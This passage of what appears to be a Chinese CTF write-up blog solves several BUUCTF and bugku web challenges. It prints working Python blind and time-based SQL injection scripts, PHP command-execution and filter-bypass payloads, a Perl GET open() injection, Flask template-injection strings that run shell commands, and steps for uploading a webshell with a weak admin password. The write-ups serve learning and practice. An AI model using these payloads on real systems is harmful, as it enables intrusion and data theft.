data(): data=\"\" payload4 = \"or if(ascii(substr((select password from users),{0},1))>{1},1,0)%23\" for i in range(1,100): l = 1 r = 130 mid = (l + r)>>1 while(l&lt;r): payloads = payload4.format(i,mid) print(url+payloads) html = requests.get(url+payloads) if \"JFIF\" in html.text: l = mid +1 else: r = mid mid = (l + r)>>1 data+=chr(mid) print(data) return data #table_name() #column_name() data() ------- c0169285544b922a11ac 随便上传一个文件，可以看到记录的是上传日志。 用文件名写马进去就可以了。 他把php过滤了 那就用短标签绕过 连shell找到flag。 [Zer0pts2020]Can you guess it?进来给了源码 &lt;?php include 'config.php'; // FLAG is defined in config.php if (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(\"I don't know what you are thinking, but I won't let you read it :)\"); } if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit(); } $secret = bin2hex(random_bytes(64)); if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if (hash_equals($secret, $guess)) { $message = 'Congratulations! The flag is: ' . FLAG; } else { $message = 'Wrong.'; } } ?> 一开始，先看了下半部分的代码。大概意思取随机64位数，你post值和它相等就弹flag。 但实际上，问题出在上半部分。 PHP_SELF basename 那么这段代码， 比如url中传入a.php/b.php 执行的是a.php $_SERVER[‘PHP_SELF’]=a.php/b.php 而basename($_SERVER[‘PHP_SELF’])=b.php if (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) {//限制结尾出现config.php exit(\"I don't know what you are thinking, but I won't let you read it :)\"); } if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit(); } 绕正则的config.php，用不可见字符绕过。 payload /index.php/config.php/%80?source[HITCON 2017]SSRFme考点：perl中 GET open漏洞 进来给了源码 &lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; } echo $_SERVER[\"REMOTE_ADDR\"]; $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); $info = pathinfo($_GET[\"filename\"]); $dir = str_replace(\".\", \"\", basename($info[\"dirname\"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\"basename\"]), $data); highlight_file(__FILE__); 代码的大概逻辑是：通过ip为用户创建个人文件夹；执行通过$url传参进来的内容，并将执行结果写入用户命名的文件中（$filename）。 回显给了ip 先确定文件夹路径是这个。 sandbox/d1bcce949acb60e760fd148cea0a9ed5读取根目录，创建文件111。 ?url=/&amp;filename=111访问sandbox/d1bcce949acb60e760fd148cea0a9ed5/111 一开始想直接读，但读不到。 按题意应该是要借readflag去读。 那么执行readflag文件。 根据file协议的代码可知，要想进行到open函数，得文件名存在才行，所以要先建立一个命令的同名文件。 再去执行命令才能成功。 payload /?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|/?url=file:bash -c /readflag|&amp;filename=123读到flag。 perl中 GET open漏洞原理GET是Lib for WWW in Perl中的命令，目的是模拟http的GET请求。 GET后接路径，本身就可以获取文件或目录内容。 GET / GET /etc/passwd perl中处理file协议的perl5/LWP/Protocol/file.pm如下,可以看到引用了open函数： #第47行 # test file exists and is readable unless (-e $path) { return HTTP::Response->new( &amp;HTTP::Status::RC_NOT_FOUND, \"File `$path' does not exist\"); } unless (-r _) { return HTTP::Response->new( &amp;HTTP::Status::RC_FORBIDDEN, 'User does not have read permission'); } ... #第127行 # read the file if ($method ne \"HEAD\") { open(F, $path) or return new #&lt;---这里 HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR, \"Cannot read file '$path': $!\"); binmode(F); $response = $self->collect($arg, $response, sub { my $content = \"\"; my $bytes = sysread(F, $content, $size); return \\$content if $bytes > 0; return \\ \"\"; }); close(F); } ... 而open函数存在命令执行漏洞。 因此，当GET使用file协议时，会间接调用到open函数，导致命令执行。 GET file:|ls [BJDCTF2020]ZJCTF，不过如此考点：php伪协议、preg_replace代码执行 源码： &lt;?php error_reporting(0); $text = $_GET[&quot;text&quot;]; $file = $_GET[&quot;file&quot;]; if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){ echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ die(&quot;Not now!&quot;); } include($file); //next.php } else{ highlight_file(__FILE__); } ?&gt;伪协议先读取next.php。 //next.php &lt;?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); } foreach($_GET as $re => $str) { echo complex($re, $str). \"\\n\"; } function getFlag(){ @eval($_GET['cmd']); } 可以看到preg_replace是在/e模式下的，这种情况存在命令执行漏洞。 可以构造Payload ?.*={${phpinfo()}}但有个问题，PHP中会将$_GET数组参数名中的非法字符转换为下划线。这样我们构造的payload就失效了。 先fuzz下哪些字符非法。 当符号为首字母时，只有.被判定为非法字符。 构造一个GET下可用的paylad ?\\S*=${phpinfo()} 找flag ?\\S*=${getflag()}&amp;cmd=system(&quot;ls%20/&quot;);cat flag [GYCTF2020]Ezsqli考点：无列名注入、bypass information bypass**下1,2回显不同 输入1 or 回显SQL Injection Checked. 试一下发现有过滤 fuzz一下 其中的information被过滤意味着我们常规的查表语句无法使用，需要有其他数据库来代替： MySQL5.7的新增了sys schemma，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。（需要root权限） sys.schema_auto_increment_columns schema_table_statistics_with_buffer x$schema_table_statistics_with_buffer sys.x$schema_flattened_keys … 诸如此类还有很多能应用的库。 参考：https://www.anquanke.com/post/id/193512 可是这个库不包含列名，所以又涉及到无列名注入的知识点。 但无列名注入通常由union来实现，而这里的union也被过滤了。 如果表中仅有一列：substr((select * from table),1,1)=‘x’即可实现目的。 但本题中不止一列，需要将查询语句与相同数量的列进行比较，进行盲注 。 例如： 执行select (select &#39;1&#39;,&#39;e~&#39;)&gt;(select * from table2 limit 1)显示0 执行select (select &#39;1&#39;,&#39;f~&#39;)&gt;(select * from table2 limit 1)显示1 执行select (select &#39;1&#39;,&#39;fl~&#39;)&gt;(select * from table2 limit 1)显示1但问题在于，mysql默认不区分大小写，因此这种形式只有在flag仅为大/小写时适用。（比如本题） 而区分大小写需要使用 SELECT CONCAT(“A”, CAST(0 AS JSON)) 来另其返回二进制字符串。 综上，脚本如下 # -*- coding:utf8 -*- import requests import string url = \"http://55e66a5c-d66a-4320-bf74-210dd4750bd7.node3.buuoj.cn/index.php\" def exp1(): str1 = ('0123456789'+string.ascii_letters+string.punctuation).replace(\"'\",\"\").replace('\"','').replace('\\\\','') flag = '' select = 'select group_concat(table_name) from sys.x$schema_flattened_keys' for j in range(1,40): for i in str1: paylaod = \"1 &amp;&amp; (select substr(({}),{},1))='{}'\".format(select, j, i) #print(paylaod) data = { 'id': paylaod, } r = requests.post(url,data=data) if 'Nu1L' in r.text: flag += i print(flag) break def exp2():#区分大小写(应该是环境有问题 跑不出) str1 = ('-0123456789'+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(\"'\",\"\").replace('\"','').replace('\\\\','') flag = '' flag_table_name = 'f1ag_1s_h3r3_hhhhh' for j in range(1,39): for i in str1: i = flag+i paylaod = \"1&amp;&amp;((select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {}))\".format(i,flag_table_name) #print(paylaod) data = { 'id': paylaod, } r = requests.post(url,data=data) if 'Nu1L' not in r.text: flag=i print(flag) break def exp3():#不区分大小写 flag = '' for i in range(1,99): for n in range(32,126): a=chr(n).encode().hex() payload = \"1&amp;&amp;((select 1,0x%s7e)>(select * from f1ag_1s_h3r3_hhhhh))\"%(flag.encode().hex()+a) data = {'id': payload} req = requests.post(url, data) print(payload) print(req.text) if 'Nu1L' in req.text: print(chr(n)) flag += chr(n) print(flag) break if __name__ == '__main__': exp1() exp2() exp3() 参考：https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/ https://blog.csdn.net/a3320315/article/details/104476566 https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2 [SWPU2019]Web1考点：无列名注入 和上一道题有点像。但由于环境问题，需要用另一种姿势来做。 一开始的登录注册纯粹是迷惑人的。 进来是一个留言板，有二次注入。 想测下字段，发现有过滤。 该说不说，这题属实麻烦，想fuzz一下结果还限制上传条数。 测了好半天。 order被过滤，用 group测字段，测得字段数为22（…）。 常规payload,buu这环境没这库… -1&#39;/**/union/**/select/**/1, (select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ,19,20,21,&#39;22 找wp去了..据说是这个环境确实有点问题，基本wp都是基于已知users表的前提下写的。这个用的是子查询。 payload -1&#39;/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39; -1&#39;/**/union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39; 正常情况还是用sys.schema_auto_increment_columns库的。 记录一下原题payload。 #group by获取列数 -1'/**/group/**/by/**/22,'11 #查看版本 -1'/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 #获取表名 -1'/**/union/**/select/**/1, (select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ,19,20,21,'22 #获取用户名 -1'/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 #获取密码 -1'/**/union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 报错注入 1'/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/database()),0x7e))/**/||'a'='a 1'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema='web1'),0x7e))/**/&amp;&amp;'a'='a 1'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.2/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;'a'='a 1'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.3/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;'a'='a [FBCTF2019]RCEService给了源码 &lt;?php putenv('PATH=/home/rceservice/jail');//修改了环境变量，只能用绝对路径来调用系统命令 if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/>&lt;br/>'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/>&lt;br/>'; } else { echo 'Attempting to run command:&lt;br/>'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/>&lt;br/>'; } } ?> 很常见的点了，preg_match这种形式，虽然过滤很多但可以用%0A绕过。 遍历根目录。根目录下没flag….. cmd={%0A&quot;cmd&quot;:&quot;ls%20/&quot;%0A} 测试代码里那个路径 ?cmd={%0A&quot;cmd&quot;:&quot;ls%20/home/rceservice/&quot;%0A} ?cmd={%0A&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0A} [GKCTF2020]老八小超市儿考点：shopxo文件上传漏洞 进来是个购物商城，powered by shopxo。 而且还很贴心的在友链直接给了源码。 文档里有后台和初始密码，试试。 弱密码永远滴绳！进来了。 找找有没有上传点。好的没传上去。直接去找找洞。 参考：https://www.zhihuifly.com/t/topic/678 先在应用中心的应用管理里下个模板，再在模板里加个木马传上去。 结果提示权限不够。 看了眼权限管理，还有个超级管理员。试了一下密码还是shopxo。 登录后传上了。 蚁剑连马。 根目录下是假flag。提示在/root里。 ​ 去看/root 没权限。 根目录下有一个Hint。 还有一个bash定时执行脚本。 去找这个py文件,他估计就是hint里提示的date。正好有可写权限。 import os import io import time os.system(\"whoami\") gk1=str(time.ctime()) gk=\"\\nGet The RooT,The Date Is Useful!\" f=io.open(\"/flag.hint\", \"rb+\") f.write(str(gk1)) f.write(str(gk)) f.close() 而且回头看下auto.sh，所属是root，755权限。 那改改py脚本获取flag就可以了。 [BJDCTF 2nd]文件探测考点：伪协议、sprintf格式化字符串漏洞、session绕过 F12有个hint。 访问home.php,网页跳转多了个参数。这么看应该是file参数后接了个.php。 很难不想到是不是有伪协议。先试试。 home.php?file=php://filter/read=convert.base64-encode/resource=system //system.php &lt;?php error_reporting(0); //要求有相应cookie if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){ echo \"&lt;script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script>\"; header(\"Refresh:0.1;url=index.php\"); die; } $str2 = '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br>~$ '; $str3 = '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br>~$ '; $str4 = '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br>~$ '; ?> &lt;?php $filter1 = '/^http:\\/\\/127\\.0\\.0\\.1\\//i'; $filter2 = '/.?f.?l.?a.?g.?/i'; if (isset($_POST['q1']) &amp;&amp; isset($_POST['q2']) &amp;&amp; isset($_POST['q3']) ) { //q1存在就行 $url = $_POST['q2'].\".y1ng.txt\"; //锚点注释掉拼接的字符串 $method = $_POST['q3']; $str1 = \"~$ python fuck.py -u \\\"\".$url .\"\\\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br>\"; echo $str1; if (!preg_match($filter1, $url) ){ //q2要求http://127.0.0.1/开头 die($str2); } if (preg_match($filter2, $url)) { //q2不能存在flag die($str3); } if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) { //q3以GET或POST开头 die($str4); } $detect = @file_get_contents($url, false); print(sprintf(\"$url method&amp;content_size:$method%d\", $detect)); } //这个没见过，在下面写总结 ?> //home.php &lt;?php setcookie(\"y1ng\", sha1(md5('y1ng')), time() + 3600); setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600); if(isset($_GET['file'])){ if (preg_match(\"/\\^|\\~|&amp;|\\|/\", $_GET['file'])) { die(\"forbidden\"); } if(preg_match(\"/.?f.?l.?a.?g.?/i\", $_GET['file'])){ die(\"not now!\"); } if(preg_match(\"/.?a.?d.?m.?i.?n.?/i\", $_GET['file'])){ die(\"You! are! not! my! admin!\"); } if(preg_match(\"/^home$/i\", $_GET['file'])){ die(\"禁止套娃\"); } else{ if(preg_match(\"/home$/i\", $_GET['file']) or preg_match(\"/system$/i\", $_GET['file'])){ $file = $_GET['file'].\".php\"; } else{ $file = $_GET['file'].\".fxxkyou!\"; } echo \"现在访问的是 \".$file . \"&lt;br>\"; require $file; } } else { echo \"&lt;script>location.href='./home.php?file=system'&lt;/script>\"; } 扫下后台。 看下robots.txt。结果这都扫出来了 = =。 先读下admin.php，伪协议那儿是不行了,从system.php入手。 q1随便传个参，q2由http://127.0.0.1/开头，拼接的&quot;.y1ng.txt&quot;用#注释掉。 $url = $_POST['q2'].\".y1ng.txt\"; if (!preg_match($filter1, $url) ){ //q2要求http://127.0.0.1/开头 die($str2); } if (preg_match($filter2, $url)) { //q2不能存在flag die($str3); } if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) { //q3以GET或POST开头 die($str4); } $detect = @file_get_contents($url, false); print(sprintf(\"$url method&amp;content_size:$method%d\", $detect));}//这个%d导致$detect无法输出 重点在q3，由于%d的存在导致$detect无法输出。 这里利用sprintf漏洞，构造q3=GET%s%,相当于 GET%S%%d //百分号被转义（%%） payload q1=1&amp;q2=http://127.0.0.1/admin.php#&amp;q3=GET%s%%d看其他人wp还可以构造q3=%1$s,也就是将函数中的第一个参数以sring型输出。 q1=1&amp;q2=http://127.0.0.1/admin.php#&amp;q3=GET%1$s得到admin.php //admin.php &lt;?php error_reporting(0); session_start(); $f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake function aesEn($data, $key) { $method = 'AES-128-CBC'; $iv = md5($_SERVER['REMOTE_ADDR'],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv)); } function Check() { if (isset($_COOKIE['your_ip_address']) &amp;&amp; $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) &amp;&amp; $_COOKIE['y1ng'] === sha1(md5('y1ng'))) return true; else return false; } //这些对flag没影响就不改了 if ( $_SERVER['REMOTE_ADDR'] == \"127.0.0.1\" ) { highlight_file(__FILE__); } else { echo \"&lt;head>&lt;title>403 Forbidden&lt;/title>&lt;/head>&lt;body bgcolor=black>&lt;center>&lt;font size='10px' color=white>&lt;br>only 127.0.0.1 can access! You know what I mean right?&lt;br>your ip address is \" . $_SERVER['REMOTE_ADDR']; } $_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']); if (isset($_GET['decrypt'])) { $decr = $_GET['decrypt']; if (Check()){ $data = $_SESSION['secret']; include 'flag_2sln2ndln2klnlksnf.php'; $cipher = aesEn($data, 'y1ng'); if ($decr === $cipher){ echo WHAT_YOU_WANT; } else { die('爬'); } } else{ header(\"Refresh:0.1;url=index.php\"); } } else { //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION['secret'] = bin2hex(random_bytes($length)); } ?> 虽然看到mt_srand很亲切，但很遗憾这次是真随机数。 得到flag的条件 $data = $_SESSION['secret']; $cipher = aesEn($data, 'y1ng'); if ($decr === $cipher){ echo WHAT_YOU_WANT; } 这里有一个点，关于session绕过。 当删去cookie中的SESSIONID，相应的SESION文件也无法被找到。这时SESSION值为NULL。 这里的 $_SESSION[‘secret’]本来是真随机数，但当我们删掉sessionid时，值被转化成NULL。 也就变成了 $cipher = aesEn(NULL, 'y1ng'); $cipher可知了。为：kD5ilwX8ZTfhTBAfaGiuVA== 删掉sessionid,传入cipher得到flag。 可能会想不到记录一下：看别人wp说由于base64编码$cipher值里可能会存在有+的情况，会被识别成空格。url转一下就可以了。 [CSCCTF 2019 Qual]FlaskLight考点：ssti 名就告诉是flask。 功能是一个搜索界面。查看源码，看见参数search。 简单测试，存在ssti。 存了几个payload试试 &#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()直接返回500。怀疑是有过滤。试了几个，globals被过滤。 拼接绕一下 &#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;ls&#39;).read() &#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;ls /flasklight&#39;).read() &#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;).read()得到flag [RoarCTF 2019]Online Proxy考点：xff注入 这个收集信息说的怪怪的。 看一眼源码。原来是记录了ip。 一开始url参传了下127.0.0.1,发现也会被记录。 那再试下加个xff头，多了个last ip。 如果再改个新的Ip。ip再次被更新了。 这里就怀疑ip被存进数据库了。 如果xff内的ip，比如sql，它第一次被输入会作为current ip，当输入一个不同的ip比如123，current成为123，而last变成sql。这时候sql被存入数据库，但并不会被执行。然而当我们第二次输入123时，因为和currect相同，lastip就会直接从数据库里查找，那sql也就被执行了。 猜测插入语句是 INSERT INTO table_name (current-ip,last-ip ) VALUES (&#39;current-ip&#39;,&#39;last-ip&#39; );那么构造payload测试 1’or&#39;1存完1’or’1，再存一个233。 再次输入，可以看到last变成1了，确实存在注入点。 （这里感觉我思路还是很乱的，之后看其他人的wp，下面这个思路就顺理成章） 恶就恶心在它flag不在当前数据库中，哈哈^ ^。 直接盲注中间就不细写了。exp如下： import requests url = \"http://node3.buuoj.cn:29831/\" head ={ \"X-Forwarded-For\":\"\", \"Cookie\" : \"track_uuid=50983484-80d0-4c5a-fd92-8ddbc2912e95\" } #payload1 = \"0' or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{},1))>{} or '0\" #payload2 = \"0' or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='F4l9_D4t4B45e')),{},1))>{} or '0\" #payload3 = \"0' or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F4l9_t4b1e')),{},1))>{} or '0\" payload = \"0' or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),{},1))>{} or '0\" flag =\"\" for i in range(1,1000): low = 32 high =137 mid = (low+high)//2 while(low &lt; high): payload1 = payload.format(i,mid) head[\"X-Forwarded-For\"] = payload1 r = requests.get(url,headers=head) head[\"X-Forwarded-For\"]= \"233\" r = requests.get(url,headers=head) r = requests.get(url,headers=head) if \"Last Ip: 1 \" in r.text: low = mid+1 else: high = mid mid =(low+high)//2 if(mid ==32 or mid ==127): break flag +=chr(mid) print(flag) print(flag) [MRCTF2020]套娃考点：代码审计 看源码，看来是第一层 &lt;!-- //1st $query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){ die('Y0u are So cutE!'); } if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){ echo \"you are going to the next ~\"; } !--> 还是传参的.会变成_的技巧 payload ?b.u.p.t=23333%0a 访问一下，再查看源码，一堆jsfuck编码，控制台解一下、 要post Merak. POST完给了源码。 &lt;?php error_reporting(0); include 'takeip.php'; ini_set('open_basedir','.'); include 'flag.php'; if(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo 'Local access only!'.\"&lt;br/>\"; $ip = getIp(); if($ip!='127.0.0.1') echo \"Sorry,you don't have permission! Your ip is :\".$ip; if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){ echo \"Your REQUEST is:\".change($_GET['file']); echo file_get_contents(change($_GET['file'])); } ?> 这就没什么了，直接构造payload ?2333=data:text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI= //加个头 client-ip: 127.0.0.1得到flag。 [WUSTCTF2020]朴实无华考点：intval漏洞，php弱类型 找了一圈，没什么有效信息。 扫一下 访问robots.txt，假的 那直接看fl4g.php（本来应该是去fakeflag那个网页的头里找，这直接扫出来了 给了源码 &lt;?php header('Content-type:text/html;charset=utf-8'); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) > 2021){ echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>\"; } else{ die(\"金钱解决不了穷人的本质问题\"); } } else{ die(\"去非洲吧\"); } //level 2 if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>\"; else die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"); }else{ die(\"去非洲吧\"); } //get flag if (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \")){ $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>\"; system($get_flag); }else{ die(\"快到非洲了\"); } }else{ die(\"去非洲吧\"); } ?> 先看level1的intval,既要求num小于2020，又要求num+1大于2020。 intval有会返回第一次出现非数字符前面的整数的这个漏洞，从这里入手。用科学计数法绕过。 &lt;?php var_dump(intval(\"1e4\")); echo \"\\n\"; var_dump(intval(\"1e4\"+1));// +1后字符串型的科学计数法被强制转换为数字 ?> -------- int(1) int(10001) 再看level2，要求$md5==md5($md5)，弱类型那就随便上网找一个，0e215962017（懒了，写脚本跑跑也行。 再看level3,这直接能执行命令了，先ls。 cat过滤了，用nl;空格过滤了，用$IFS$9。 最终payload ?num=1e4&amp;md5=0e215962017&amp;get_flag=nl$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag","tags":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://dddwmr.github.io/tags/BUUCTF/"}]},{"title":"insert into","date":"2019-08-24T00:00:00.000Z","path":"2019/08/24/insert into/","text":"观察题目 可以看到注入点应该在http头的x-forwarded-for上 这里还把‘，’过滤了 因为把，过滤了 if是用不了这里用select case when..then..else..end代替substr也用不了 但是可以用 from 1 for 1代替为了节约时间，可以先手工查字段长度这里以database()做示范: x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a 可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a 当然转成ascii码用二分法更有效率但为了更加方便 这里写一个脚本 !/usr/bin/python -*- coding: UTF-8 -*- import requests import string mystring = string.ascii_letters+string.digits#所有字母和数字的集合 url='http://123.206.87.240:8002/web15/' #查库名 data = \"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1\" #这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15 #查表名 data = \"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1\"#查出来时clineip和flag #查字段名 data = \"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1\" #查出来是 flag #查内容 data= \"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 \" flag = '' for i in range(1,6):#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以 for j in mystring: try: headers = {'x-forwarded-for':data.format(str(i),j)}#format格式化输出，把查到的str的每一字符依次赋到{0}里去 res = requests.get(url,headers=headers,timeout=3)#一旦延时超过3s，继续向下执行代码 except requests.exceptions.ReadTimeout:#跳到这里执行，得到所求 flag += j print(flag) break print('The final flag:'+flag) 由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}（最好每次只开一个运行 不然出错概率太大）","tags":[{"name":"bugku","slug":"bugku","permalink":"http://dddwmr.github.io/tags/bugku/"},{"name":"sql注入","slug":"sql注入","permalink":"http://dddwmr.github.io/tags/sql注入/"}]}]